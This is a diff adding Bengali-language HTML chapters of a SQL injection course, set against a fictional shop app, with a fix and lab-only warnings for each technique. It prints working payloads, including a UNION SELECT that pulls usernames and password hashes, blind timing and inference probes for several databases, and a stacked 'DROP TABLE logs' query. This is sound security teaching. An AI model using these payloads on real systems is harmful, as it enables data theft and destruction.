+    </tbody>
+  </table>
+  <p>Secure পদ্ধতিতে (parameterized query / prepared statement) database driver input ও query-কে আলাদা চ্যানেলে পাঠায়, তাই input যতই "কোডের মতো" দেখতে হোক না কেন, database সেটিকে কখনোই syntax হিসেবে গণ্য করে না — শুধু ডেটা হিসেবে। এটি অধ্যায় ১৭-এ বিস্তারিতভাবে আলোচিত হবে।</p>
+
+  <h2>User-Controlled Input বনাম Server-Controlled Value</h2>
+  <p>যেকোনো মান যা সরাসরি বা পরোক্ষভাবে ইউজার নিয়ন্ত্রণ করতে পারে তা <strong>user-controlled</strong> — এর মধ্যে আছে form field, URL parameter, cookie, HTTP header (যেমন <code>User-Agent</code>, যদি তা log/query-তে ব্যবহৃত হয়), JSON body ইত্যাদি। অন্যদিকে, সার্ভারে hardcode করা মান বা ইউজার কখনোই পরিবর্তন করতে পারে না এমন মান হলো <strong>server-controlled</strong>। SQLi সবসময় user-controlled input-কে কেন্দ্র করে ঘটে — কিন্তু মনে রাখা জরুরি যে "user-controlled" মানেই শুধু visible form field নয়; cookie বা hidden field-ও user-controlled, কারণ attacker ব্রাউজার ছাড়াই সরাসরি HTTP request পাঠিয়ে এগুলো পরিবর্তন করতে পারে।</p>
+
+  <h2>SQL Syntax, Query Context ও Quoting</h2>
+  <p>Injection সফল হয় কি না তা নির্ভর করে input ঠিক কোথায় বসছে তার উপর — একে বলে <strong>query context</strong>। প্রধান তিনটি context:</p>
+  <div class="grid2">
+    <div class="card"><h4>String context</h4><p><code>WHERE name = '<em>input</em>'</code> — এখানে input একটি quoted string-এর ভেতরে বসে; injection-এর জন্য প্রথমে quote বন্ধ করতে হয়।</p></div>
+    <div class="card"><h4>Numeric context</h4><p><code>WHERE id = <em>input</em></code> — এখানে কোনো quote নেই, তাই সরাসরি SQL keyword/operator যোগ করা যায়।</p></div>
+    <div class="card"><h4>Identifier/clause context</h4><p><code>ORDER BY <em>input</em></code> — এখানে input কলামের নাম বা দিক (ASC/DESC) নির্ধারণ করে, ভিন্ন ধরনের payload দরকার হয়।</p></div>
+  </div>
+  <p>তাই একটি payload যা string context-এ কাজ করে, তা numeric context-এ কাজ নাও করতে পারে — এবং উল্টোটাও সত্য। প্রতিটি testing ধাপে context বোঝা আবশ্যক।</p>
+
+  <h2>SQLi-এর Root Causes</h2>
+  <ul>
+    <li>Input ও code (query syntax)-কে আলাদা না রাখা — string concatenation দিয়ে query বানানো।</li>
+    <li>Input validation-এর ঘাটতি বা শুধু client-side validation-এর উপর নির্ভর করা।</li>
+    <li>ORM বা query builder ভুলভাবে ব্যবহার করা (যেমন raw query মোডে ফিরে যাওয়া)।</li>
+    <li>Dynamic table/column নাম তৈরির সময় allowlist ব্যবহার না করা।</li>
+    <li>Database account-কে প্রয়োজনের চেয়ে বেশি privilege দেওয়া, যা impact বাড়িয়ে দেয়।</li>
+  </ul>
+
+  <h2>SQLi বনাম XSS, IDOR ও Command Injection</h2>
+  <table>
+    <thead><tr><th>Vulnerability</th><th>লক্ষ্য</th><th>মূল পার্থক্য</th></tr></thead>
+    <tbody>
+      <tr><td>SQL Injection</td><td>Database query</td><td>Input, SQL syntax-এর অংশ হয়ে যায়</td></tr>
+      <tr><td>XSS (Cross-Site Scripting)</td><td>ব্রাউজার (client-side)</td><td>Input, HTML/JavaScript হিসেবে render হয়; server-এর বদলে ভিকটিমের ব্রাউজারে কার্যকর হয়</td></tr>
+      <tr><td>IDOR (Insecure Direct Object Reference)</td><td>Authorization logic</td><td>Query নিরাপদ থাকতে পারে, কিন্তু অনুমতি-যাচাই অনুপস্থিত — যেমন নিজের id দিয়ে অন্যের অর্ডার দেখতে পারা</td></tr>
+      <tr><td>Command Injection</td><td>OS shell</td><td>Input, SQL-এর বদলে operating system command-এর অংশ হয়ে যায়</td></tr>
+    </tbody>
+  </table>
+  <p>এই পার্থক্যগুলো গুরুত্বপূর্ণ কারণ একই লক্ষণ (যেমন unexpected error বা ডেটা leak) একাধিক ভিন্ন vulnerability থেকে আসতে পারে — ভুল শ্রেণীবিভাগ ভুল fix-এর দিকে নিয়ে যেতে পারে।</p>
+
+  <h2>SQLi-এর Security Impact এবং Risk Assessment</h2>
+  <p>SQLi-এর impact নির্ভর করে — database account-এর privilege কতটা, কী ধরনের ডেটা সংরক্ষিত আছে, injection কোন ধরনের (read-only নাকি write-capable), এবং application-এর আর্কিটেকচার কেমন। সম্ভাব্য impact-এর মধ্যে আছে: confidentiality (গোপন ডেটা ফাঁস), integrity (ডেটা পরিবর্তন), availability (ডেটা মুছে ফেলা বা সার্ভিস বিঘ্নিত করা), এবং কিছু ক্ষেত্রে authentication বাইপাস বা privilege escalation।</p>
+
+  <h3>CVSS ও Severity নির্ধারণের প্রাথমিক ধারণা</h3>
+  <p><strong>CVSS (Common Vulnerability Scoring System)</strong> হলো একটি মানসম্মত পদ্ধতি যা দিয়ে vulnerability-এর তীব্রতা (severity) সংখ্যাগতভাবে (০–১০) প্রকাশ করা হয়। SQLi-এর ক্ষেত্রে CVSS score নির্ধারণে বিবেচ্য বিষয়: attack vector (network থেকে সম্ভব কি না), privileges required (authentication লাগে কি না), এবং confidentiality/integrity/availability-এর উপর প্রভাবের মাত্রা। একটি unauthenticated, data-exfiltration-সক্ষম SQLi সাধারণত Critical (৯.০+) হিসেবে বিবেচিত হয়, যেখানে একটি authenticated, সীমিত-impact blind SQLi হয়তো Medium-High রেঞ্জে পড়তে পারে। প্রকৃত score নির্ধারণের জন্য official CVSS calculator ব্যবহার করা উচিত; এখানে শুধু প্রাথমিক ধারণা দেওয়া হলো।</p>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের দুটি query-এর মধ্যে কোনটি <code>' OR '1'='1</code> টাইপ attack-এর জন্য ঝুঁকিপূর্ণ, এবং কেন?</p>
+    <div class="codeblock"><pre><code>// A
+"SELECT * FROM users WHERE id = " + userId   // userId সংখ্যা হওয়ার কথা
+
+// B
+"SELECT * FROM users WHERE name = '" + userName + "'"</code></pre></div>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>SQL Injection ঘটে যখন user input, SQL query-এর syntax-এ মিশে যায় এবং query-এর মূল গঠন পরিবর্তন করে দেয়। এটি query context (string/numeric/identifier)-এর উপর নির্ভরশীল, এবং এর impact database privilege ও application আর্কিটেকচারের উপর নির্ভর করে পরিবর্তিত হয়।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li><code>' OR '1'='1</code> payload কেন কাজ করে — ধাপে ধাপে ব্যাখ্যা করুন।</li>
+      <li>String context ও numeric context-এর জন্য payload কেন আলাদা হতে হবে?</li>
+      <li>SQLi ও IDOR-এর মূল পার্থক্য কী?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter01"><span>পূর্ববর্তী</span>অধ্যায় ০১</a>
+    <a class="next" href="/chapter03"><span>পরবর্তী</span>অধ্যায় ০৩ — SQLi-এর প্রধান ধরন</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 3
+========================================================= -->
+<section class="chapter" id="ch03">
+  <div class="eyebrow">অধ্যায় ০৩ · ভিত্তি</div>
+  <h1>SQLi-এর প্রধান ধরন</h1>
+  <p class="sub">এই অধ্যায়ে SQLi-এর ১৭টি প্রধান ধরন বিস্তারিতভাবে আলোচনা করা হয়েছে — Error-based থেকে শুরু করে Search/Filter/Sort injection পর্যন্ত।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch03" id="done-ch03"><label for="done-ch03">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout warn"><div class="ic">🧪</div><p>নিচের সব উদাহরণ একটি <strong>fictional</strong> ওয়েব অ্যাপ্লিকেশন ("ShopMock") এবং synthetic ডেটার উপর ভিত্তি করে তৈরি, শুধুমাত্র শেখার উদ্দেশ্যে। এগুলো শুধুমাত্র নিজের lab বা অনুমোদিত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <!-- ============ 1. ERROR-BASED ============ -->
+  <h2 id="error-based">১. Error-Based SQL Injection</h2>
+  <p><strong>এটি কী:</strong> Error-based SQLi হলো এমন একটি কৌশল যেখানে attacker ইচ্ছাকৃতভাবে database-এ একটি syntax বা logical error ঘটায়, এবং application সেই error message (বা তার কিছু অংশ) সরাসরি response-এ দেখিয়ে দেয়। এই error message থেকে database সম্পর্কে তথ্য (table নাম, column নাম, এমনকি actual ডেটা) বের করে আনা যায়।</p>
+  <p><strong>কেন ঘটে:</strong> Development বা debugging পরিবেশে প্রায়ই verbose error reporting চালু রাখা হয়, যা production-এও ভুলবশত থেকে যায়। যখন backend database error-কে catch না করে সরাসরি ইউজারকে দেখায়, তখন এই ফাঁক তৈরি হয়।</p>
+  <p><strong>কীভাবে কাজ করে:</strong> একটি single quote পাঠিয়ে query ভেঙে দিলে database একটি syntax error তৈরি করে। যদি সেই error response-এ দৃশ্যমান হয়, তাহলে বোঝা যায় input database query-তে পৌঁছাচ্ছে এবং sanitize হচ্ছে না।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>ShopMock — product পেজ: /product?id=7</span><button class="copy-btn">কপি</button></div>
+    <pre><code>Normal request:  GET /product?id=7
+Backend query:   SELECT name, price FROM products WHERE id = 7
+
+Test input:      GET /product?id=7'
+Backend query:   SELECT name, price FROM products WHERE id = 7'
+Database error:  You have an error in your SQL syntax near "'" at line 1</code></pre>
+  </div>
+  <p><strong>Evidence:</strong> একটি single quote পাঠানোর পর database-নির্দিষ্ট error message (যেমন MySQL-এর "You have an error in your SQL syntax") দেখা যাওয়া শক্তিশালী ইঙ্গিত। তবে এটি নিজে থেকেই exploitation প্রমাণ করে না — শুধু বোঝায় যে input query-তে পৌঁছাচ্ছে।</p>
+  <p><strong>Manual testing:</strong> একটি করে parameter-এ <code>'</code>, <code>"</code>, <code>\</code>, <code>)</code> পাঠিয়ে response পর্যবেক্ষণ করুন। error message-এর টেক্সট, HTTP status code এবং response length বেসলাইনের (normal request) সাথে তুলনা করুন।</p>
+  <p><strong>কোন পরিস্থিতিতে উপযোগী:</strong> যখন application verbose error দেখায় (সাধারণত development/staging পরিবেশে, বা misconfigured production-এ)। Production-এ generic error page থাকলে এই টেকনিক কাজ করবে না — তখন blind techniques প্রয়োজন।</p>
+  <p><strong>Common false positives:</strong> একটি generic HTTP ৫০০ error (যার মধ্যে কোনো SQL-নির্দিষ্ট তথ্য নেই) মানেই SQLi নয় — এটি অন্য কোনো backend bug-ও হতে পারে। শুধুমাত্র তখনই confirm করুন যখন error message-টি স্পষ্টভাবে database engine-এর নিজস্ব syntax বা keyword উল্লেখ করে।</p>
+  <p><strong>সম্ভাব্য impact:</strong> Error message-এর মাধ্যমে table/column নাম জানা গেলে, তা পরবর্তীতে UNION-based বা অন্য টেকনিকে সুনির্দিষ্ট ডেটা বের করতে ব্যবহার করা যায় — তাই নিজে থেকে কম impact মনে হলেও এটি প্রায়ই পরবর্তী ধাপের চাবিকাঠি।</p>
+  <p><strong>Fix:</strong> Production-এ generic error page দেখানো, prepared statement ব্যবহার করা (ফলে error-ই ঘটবে না), এবং centralised error logging রাখা যাতে developer দেখতে পারে কিন্তু ইউজার না দেখে।</p>
+
+  <details><summary>Database-specific error patterns (সংক্ষিপ্ত)</summary>
+    <div class="inner">
+      <table>
+        <thead><tr><th>DBMS</th><th>Typical error signature</th></tr></thead>
+        <tbody>
+          <tr><td>MySQL</td><td>"You have an error in your SQL syntax; check the manual..."</td></tr>
+          <tr><td>PostgreSQL</td><td>"ERROR: syntax error at or near ..."</td></tr>
+          <tr><td>MSSQL</td><td>"Unclosed quotation mark after the character string ..."</td></tr>
+          <tr><td>Oracle</td><td>"ORA-00933: SQL command not properly ended"</td></tr>
+          <tr><td>SQLite</td><td>"near \"...\": syntax error"</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </details>
+
+  <!-- ============ 2. UNION-BASED ============ -->
+  <h2 id="union-based">২. UNION-Based SQL Injection</h2>
+  <p><strong>এটি কী:</strong> UNION-based SQLi একটি <strong>in-band</strong> কৌশল, যেখানে attacker SQL-এর <code>UNION</code> অপারেটর ব্যবহার করে মূল query-এর ফলাফলের সাথে নিজের তৈরি করা একটি দ্বিতীয় query-এর ফলাফল জুড়ে দেয়, এবং application-এর নিজস্ব response-এর ভেতরেই সেই অতিরিক্ত ডেটা দেখতে পায়।</p>
+  <p><strong>কেন ঘটে:</strong> Application যদি query result সরাসরি response page-এ দেখায় (যেমন product নাম, দাম) এবং input sanitize না হয়, তাহলে <code>UNION SELECT</code> দিয়ে অন্য টেবিলের ডেটা সেই একই জায়গায় "ইনজেক্ট" করে দেখানো সম্ভব।</p>
+  <p><strong>কীভাবে কাজ করে — ধাপে ধাপে:</strong></p>
+  <ol>
+    <li><strong>Column count নির্ধারণ:</strong> মূল query ঠিক কতগুলো কলাম ফেরত দেয় তা জানা দরকার, কারণ <code>UNION</code>-এর দুই পাশের কলাম সংখ্যা মিলতে হয়।</li>
+    <li><strong>Data type সামঞ্জস্য:</strong> প্রতিটি কলামের data type (string/number) মিলতে হবে, নইলে error আসবে।</li>
+    <li><strong>কোন কলাম display হয়:</strong> response-এ আসলে কোন কলামের মান দেখানো হচ্ছে তা শনাক্ত করে, সেই জায়গায় কাঙ্ক্ষিত ডেটা বসানো।</li>
+  </ol>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>Column count বের করা — ORDER BY পদ্ধতি</span><button class="copy-btn">কপি</button></div>
+    <pre><code>GET /product?id=7 ORDER BY 1--   (ঠিক আছে)
+GET /product?id=7 ORDER BY 2--   (ঠিক আছে)
+GET /product?id=7 ORDER BY 3--   (ঠিক আছে)
+GET /product?id=7 ORDER BY 4--   (Error: "Unknown column '4' in order clause")
+→ এখান থেকে বোঝা যায় মূল query-তে কলাম সংখ্যা ৩টি।</code></pre>
+  </div>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>NULL দিয়ে UNION alignment</span><button class="copy-btn">কপি</button></div>
+    <pre><code>GET /product?id=-1 UNION SELECT NULL, NULL, NULL--
+→ এরপর কোন position-এ টেক্সট দেখা যাচ্ছে তা বোঝার জন্য একটি করে NULL-কে
+  পরিচিত স্ট্রিং দিয়ে প্রতিস্থাপন করুন:
+
+GET /product?id=-1 UNION SELECT NULL, 'MARKER123', NULL--
+→ যদি response-এ "MARKER123" দেখা যায়, তাহলে দ্বিতীয় কলামটি display হয়।</code></pre>
+  </div>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>প্রকৃত ডেটা বের করা (lab-এ synthetic ডেটার উপর)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>GET /product?id=-1 UNION SELECT NULL, username, password_hash FROM users--</code></pre>
+  </div>
+  <p><strong>Evidence:</strong> response-এ এমন ডেটা দেখা যাওয়া যা মূল query (products টেবিল) থেকে আসার কথা না — যেমন username/password_hash জাতীয় মান। <code>id=-1</code> ব্যবহার করা হয় যাতে মূল query কোনো সারি ফেরত না দেয়, ফলে শুধু UNION-এর ফলাফলই স্পষ্টভাবে দেখা যায়।</p>
+  <p><strong>Database-specific note:</strong> MySQL-এ একটি একক query-তে <code>SELECT</code> ছাড়া sub-query চালানো সহজ না হলেও <code>UNION</code> সরাসরি সমর্থিত; Oracle-এ প্রতিটি <code>SELECT</code>-এ অন্তত একটি টেবিল লাগে, তাই <code>FROM dual</code> ব্যবহার করতে হয় (যেমন <code>UNION SELECT NULL FROM dual</code>); MSSQL ও PostgreSQL-এ টেবিল ছাড়াই <code>SELECT</code> চলে।</p>
+  <p><strong>Common false positives:</strong> Column count ভুল হলে error আসবে, কিন্তু সেই error মানেই vulnerability না থাকা নয় — শুধু column count ভুল; আরও চেষ্টা প্রয়োজন। Data-type mismatch error-ও একই রকম বিভ্রান্তি তৈরি করতে পারে।</p>
+  <p><strong>সম্ভাব্য impact:</strong> UNION-based SQLi সাধারণত সবচেয়ে বেশি তথ্য দ্রুত বের করার সুযোগ দেয়, কারণ এটি সরাসরি response-এ ডেটা দেখায় (in-band) — blind টেকনিকের তুলনায় অনেক দ্রুত।</p>
+  <p><strong>Fix:</strong> Parameterized query ব্যবহার করলে input কখনোই <code>UNION</code> keyword হিসেবে parse হবে না, যতই সেটি টেক্সটে থাকুক না কেন।</p>
+
+  <!-- ============ 3. BOOLEAN-BASED BLIND ============ -->
+  <h2 id="boolean-blind">৩. Boolean-Based Blind SQL Injection</h2>
+  <p><strong>এটি কী:</strong> Boolean-based blind SQLi তখন ব্যবহৃত হয় যখন application response-এ সরাসরি ডেটা বা error message দেখায় না, কিন্তু একটি query-এর true/false ফলাফলের উপর ভিত্তি করে response-এর আচরণ (content, length, বা status code) আলাদা হয়ে যায়।</p>
+  <p><strong>কেন ঘটে:</strong> Input এখনো sanitize না হয়ে query-তে পৌঁছাচ্ছে, কিন্তু application error suppress করে রেখেছে (generic error page)। তবুও condition true না false তার ভিত্তিতে response আলাদা হওয়ায় একটি "হ্যাঁ/না" চ্যানেল তৈরি হয়।</p>
+  <p><strong>কীভাবে কাজ করে:</strong> Attacker একটি condition পাঠায় যা সবসময় true, এবং একটি যা সবসময় false, তারপর দুই response তুলনা করে। যদি আলাদা হয়, তাহলে বোঝা যায় condition response-কে প্রভাবিত করছে — এরপর ধাপে ধাপে (bit-by-bit বা character-by-character) প্রকৃত ডেটা সম্পর্কে true/false প্রশ্ন করে তথ্য পুনর্গঠন করা যায়।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>True/False baseline তুলনা</span><button class="copy-btn">কপি</button></div>
+    <pre><code>GET /product?id=7 AND 1=1--   → স্বাভাবিক response (প্রোডাক্ট দেখা যায়)
+GET /product?id=7 AND 1=2--   → ভিন্ন response (প্রোডাক্ট "পাওয়া যায়নি")
+
+→ দুটি response-এর পার্থক্য প্রমাণ করে যে condition সত্যিই query-কে প্রভাবিত করছে।</code></pre>
+  </div>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>Character-by-character inference (ধারণাগত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>GET /product?id=7 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
+→ response "true" হলে প্রথম অক্ষর 'a'; "false" হলে পরবর্তী অক্ষর চেষ্টা করুন (b, c, ...)
+→ এভাবে পুরো username ধীরে ধীরে পুনর্গঠন করা সম্ভব।</code></pre>
+  </div>
+  <p><strong>Evidence:</strong> একই request দুইবার, শুধু condition আলাদা রেখে পাঠিয়ে response-এর বিষয়বস্তু/দৈর্ঘ্য/status code-এ ধারাবাহিক ও পুনরুৎপাদনযোগ্য (repeatable) পার্থক্য দেখা।</p>
+  <p><strong>Common false positives:</strong> Dynamic content (যেমন "View count: 1234" যা প্রতিবার বাড়ছে), caching, বা session-নির্ভর ডেটা response-এ ছোট পার্থক্য তৈরি করতে পারে যা condition-এর সাথে সম্পর্কিত নয়। তাই একই condition বারবার পাঠিয়ে ফলাফল সামঞ্জস্যপূর্ণ (consistent) কি না তা যাচাই করা জরুরি।</p>
+  <p><strong>সম্ভাব্য impact:</strong> Error-based বা UNION-based-এর চেয়ে ধীর (প্রতিটি অক্ষরের জন্য একাধিক request লাগে), কিন্তু সমানভাবে বিপজ্জনক — সময় নিয়ে পুরো ডেটাবেস বের করে আনা সম্ভব।</p>
+  <p><strong>Fix:</strong> Parameterized query; এছাড়াও generic error page থাকা সত্ত্বেও true/false condition আলাদা response তৈরি না করা (uniform response/behavior) একটি ভালো defense-in-depth অভ্যাস।</p>
+
+  <!-- ============ 4. TIME-BASED BLIND ============ -->
+  <h2 id="time-blind">৪. Time-Based Blind SQL Injection</h2>
+  <p><strong>এটি কী:</strong> Time-based blind SQLi তখন ব্যবহৃত হয় যখন response content-এ কোনো দৃশ্যমান পার্থক্যও থাকে না (এমনকি boolean-based টেকনিকও কাজ করে না), কিন্তু attacker একটি conditional delay function ব্যবহার করে — যদি condition true হয়, database কয়েক সেকেন্ড "ঘুমিয়ে" থাকে, আর response আসতে সেই পরিমাণ সময় বেশি লাগে।</p>
+  <p><strong>কেন ঘটে:</strong> Input এখনো query-তে পৌঁছাচ্ছে, কিন্তু response content সম্পূর্ণ identical থাকে true/false উভয় ক্ষেত্রেই — একমাত্র পার্থক্য response আসার সময়ে (timing)।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>Database-ভিত্তিক delay syntax</span><button class="copy-btn">কপি</button></div>
+    <pre><code>-- MySQL
+?id=7 AND IF(1=1, SLEEP(5), 0)--
+
+-- PostgreSQL
+?id=7 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+-- Microsoft SQL Server
+?id=7; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+-- Oracle (delay-সক্ষম function কল, lab-নির্ভর)
+?id=7 AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual)</code></pre>
+  </div>
+  <p><strong>Evidence:</strong> <code>condition=true</code> হলে response আসতে উল্লেখযোগ্যভাবে বেশি সময় লাগা (যেমন ~৫ সেকেন্ড), আর <code>condition=false</code> হলে স্বাভাবিক সময় লাগা — এবং এই পার্থক্য বারবার test করলে সামঞ্জস্যপূর্ণভাবে পুনরুৎপাদনযোগ্য হওয়া।</p>
+  <p><strong>Network latency ও timing noise:</strong> ইন্টারনেট/নেটওয়ার্কের স্বাভাবিক ওঠানামার কারণে একবারের measurement বিভ্রান্তিকর হতে পারে। তাই একাধিকবার (৩–৫ বার) measurement নিয়ে গড় (average) ও consistency যাচাই করা উচিত, এবং delay value যথেষ্ট বড় (যেমন ৫–১০ সেকেন্ড) রাখা উচিত যাতে স্বাভাবিক নেটওয়ার্ক latency-এর সাথে গুলিয়ে না যায়।</p>
+  <p><strong>Common false positives:</strong> সার্ভার-সাইড rate limiting, ধীর তৃতীয়-পক্ষ API কল, অথবা সাময়িক সার্ভার লোড — এসবও response delay তৈরি করতে পারে। তাই false condition-এর সাথে বারবার তুলনা করা আবশ্যক।</p>
+  <p><strong>সম্ভাব্য impact:</strong> এটি সবচেয়ে ধীরতম টেকনিক (প্রতিটি bit/character-এর জন্য সেকেন্ড-ব্যয়ী delay লাগে), কিন্তু যখন আর কোনো visible channel থাকে না তখন এটিই একমাত্র ব্যবহারযোগ্য উপায় হতে পারে — তাই এর impact ছোট মনে হলেও এটিকে অবমূল্যায়ন করা ঠিক না।</p>
+  <p><strong>Fix:</strong> Parameterized query মূল সমাধান। এছাড়া database-level query timeout নির্ধারণ করে রাখলে delay-based exploitation-এর কার্যকারিতা কিছুটা সীমিত করা যায় (তবে এটি root cause ফিক্স নয়)।</p>
+
+  <div class="callout warn"><div class="ic">⚠️</div><p>Time-based টেকনিক lab/authorized পরিবেশেও সীমিত সংখ্যক request-এ রাখা উচিত — অতিরিক্ত delay-ভিত্তিক request পাঠানো target সার্ভারের উপর অনিচ্ছাকৃত লোড (সামান্য denial-of-service-এর মতো প্রভাব) তৈরি করতে পারে।</p></div>
+
+  <!-- ============ 5. STACKED QUERIES ============ -->
+  <h2 id="stacked-queries">৫. Stacked Queries (Multi-Statement SQLi)</h2>
+  <p><strong>এটি কী:</strong> Stacked queries (বা multi-statement injection) হলো এমন একটি কৌশল যেখানে attacker একটি সেমিকোলন (<code>;</code>) ব্যবহার করে মূল query-এর পর সম্পূর্ণ নতুন, স্বতন্ত্র একটি SQL statement জুড়ে দেয় — যেমন <code>SELECT</code>-এর বদলে <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, বা এমনকি stored procedure কল।</p>
+  <p><strong>কেন ঘটে:</strong> কিছু database driver/API (যেমন PHP-এর PDO নির্দিষ্ট ড্রাইভার সেটিংসে, বা MSSQL-এর ডিফল্ট আচরণ) একই connection-এ একাধিক সেমিকোলন-বিচ্ছিন্ন statement execute করার অনুমতি দেয়। যদি এই সুবিধা চালু থাকে এবং input sanitize না হয়, তাহলে attacker সম্পূর্ণ নতুন statement যোগ করতে পারে।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>ধারণাগত উদাহরণ (MSSQL-এ অনেক driver-এ by-default সমর্থিত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>Input:  7; DROP TABLE logs--
+Query:  SELECT * FROM products WHERE id = 7; DROP TABLE logs--
+
+→ প্রথম statement স্বাভাবিকভাবে চলে, এরপর সেমিকোলনের পরের statement
+  (এখানে ধ্বংসাত্মক DROP TABLE) আলাদাভাবে execute হয়।</code></pre>
+  </div>
+  <p><strong>গুরুত্বপূর্ণ সীমাবদ্ধতা:</strong> MySQL-এর সাধারণ ওয়েব ব্যবহারে (যেমন PHP-এর <code>mysqli</code> ডিফল্ট single-statement মোডে) stacked queries সাধারণত সমর্থিত না, কিন্তু MSSQL ও PostgreSQL-এর অনেক driver-এ এটি ডিফল্টভাবে সম্ভব হতে পারে। তাই stacked query টেস্ট করার আগে target-এর backend database ও driver সম্পর্কে ধারণা থাকা জরুরি — "সব জায়গায় কাজ করবে" এমন কোনো universal payload নেই।</p>
+  <p><strong>Evidence:</strong> Lab পরিবেশে নিরাপদ, non-destructive প্রমাণ (যেমন একটি harmless <code>WAITFOR DELAY</code> দ্বিতীয় statement হিসেবে যোগ করে timing differenc যাচাই করা) ব্যবহার করা উচিত — বাস্তব ডেটা পরিবর্তন/মোছা করে প্রমাণ করা কখনোই প্রয়োজনীয় না এবং এটি destructive।</p>
+  <p><strong>সম্ভাব্য impact:</strong> এটি SQLi-এর মধ্যে সবচেয়ে বেশি ঝুঁকিপূর্ণ ধরনগুলোর একটি, কারণ এটি শুধু ডেটা পড়ার (SELECT) সীমাবদ্ধতা ছাড়িয়ে ডেটা পরিবর্তন, মোছা, এমনকি (কিছু পরিস্থিতিতে, উচ্চ-privilege account হলে) stored procedure-এর মাধ্যমে OS-level command পর্যন্ত পৌঁছাতে পারে।</p>
+  <p><strong>Fix:</strong> Parameterized query ব্যবহার করলে এমনিতেই সেমিকোলন দিয়ে আলাদা statement ইনজেক্ট করা অসম্ভব হয়ে যায়। এছাড়া, driver/connection লেভেলে multi-statement execution বন্ধ রাখা (যেখানে সম্ভব) একটি অতিরিক্ত defense layer।</p>
+
+  <div class="callout danger"><div class="ic">⛔</div><p>Stacked query টেস্ট করার সময় কখনোই <code>DROP</code>, <code>DELETE</code>, বা <code>UPDATE</code>-জাতীয় destructive statement বাস্তব বা shared lab ডেটাবেসে চালাবেন না। প্রমাণের জন্য সবসময় non-destructive পদ্ধতি (যেমন timing-based verification) ব্যবহার করুন, এবং শুধুমাত্র নিজের isolated lab-এ destructive টেস্ট করুন।</p></div>
+
+  <!-- ============ 6. CONTENT-BASED INFERENCE ============ -->
+  <h2 id="content-based">৬. Content-Based Inference</h2>
+  <p><strong>এটি কী:</strong> Content-based inference হলো boolean-based blind SQLi-এরই একটি সাধারণ ছাতা-ধারণা (umbrella concept) — যেখানে attacker সরাসরি error বা ডেটা না দেখেই, শুধুমাত্র response-এর <em>content</em>-এ ছোট পরিবর্তন (যেমন একটি নির্দিষ্ট শব্দ/সেকশন থাকা বা না-থাকা, product count ভিন্ন হওয়া, image দেখানো না-দেখানো) পর্যবেক্ষণ করে condition true/false অনুমান করে।</p>
+  <p><strong>কেন ঘটে:</strong> Application হয়তো error suppress করে, কিন্তু query logic-এর ফলাফল অনুযায়ী UI-এর কোনো অংশ শর্তসাপেক্ষে দেখায়/লুকায় — যেমন "কোনো ফলাফল পাওয়া যায়নি" বার্তা, অথবা একটি খালি তালিকা বনাম ভরা তালিকা।</p>
+  <p><strong>কীভাবে কাজ করে ও পার্থক্য:</strong> Boolean-based blind মূলত একটি নির্দিষ্ট true/false response pattern-এর উপর নির্ভর করে, যেখানে content-based inference আরও বিস্তৃত — এটি শুধু true/false নয়, বরং <em>কতগুলো সারি ফেরত এলো</em>, কোন নির্দিষ্ট item দেখা গেল, এরকম আরও সূক্ষ্ম সংকেতও ব্যবহার করতে পারে। যেমন row-count ভিত্তিক inference: <code>AND (SELECT COUNT(*) FROM users) > 5</code> দিয়ে ধাপে ধাপে বাইনারি-সার্চ পদ্ধতিতে প্রকৃত সংখ্যা বের করা যায়।</p>
+  <div class="codeblock"><div class="cb-head"><span>Row-count বাইনারি সার্চ উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>?id=7 AND (SELECT COUNT(*) FROM users) > 50--   → true/false
+?id=7 AND (SELECT COUNT(*) FROM users) > 25--   → পরের ধাপ
+... এভাবে বাইনারি সার্চে সঠিক সংখ্যায় পৌঁছানো, অনেক কম request-এ</code></pre></div>
+  <p><strong>Evidence ও false positives:</strong> যেহেতু signal subtle, pagination/sorting-জনিত স্বাভাবিক ভিন্নতা থেকে প্রকৃত content পার্থক্য আলাদা করা কঠিন হতে পারে — তাই বেসলাইন বারবার নিশ্চিত করা জরুরি। <strong>Impact ও fix:</strong> boolean-blind-এর অনুরূপ; parameterized query মূল সমাধান।</p>
+
+  <!-- ============ 7 & 8. IN-BAND / OUT-OF-BAND ============ -->
+  <h2 id="in-out-band">৭–৮. In-Band ও Out-of-Band SQL Injection</h2>
+  <p>এই দুটি আলাদা exploitation টেকনিক নয়, বরং <strong>communication channel</strong> অনুযায়ী SQLi-কে শ্রেণীবদ্ধ করার একটি উপায়।</p>
+  <h3>In-band SQL Injection</h3>
+  <p><strong>এটি কী:</strong> যখন attacker একই HTTP response-এর মধ্যেই ফলাফল দেখতে পায় — error-based ও UNION-based উভয়ই in-band, কারণ এতে একই চ্যানেল (HTTP response) দিয়ে request পাঠানো এবং ফলাফল পড়া — দুটোই হয়।</p>
+  <h3>Out-of-Band (OOB) SQL Injection</h3>
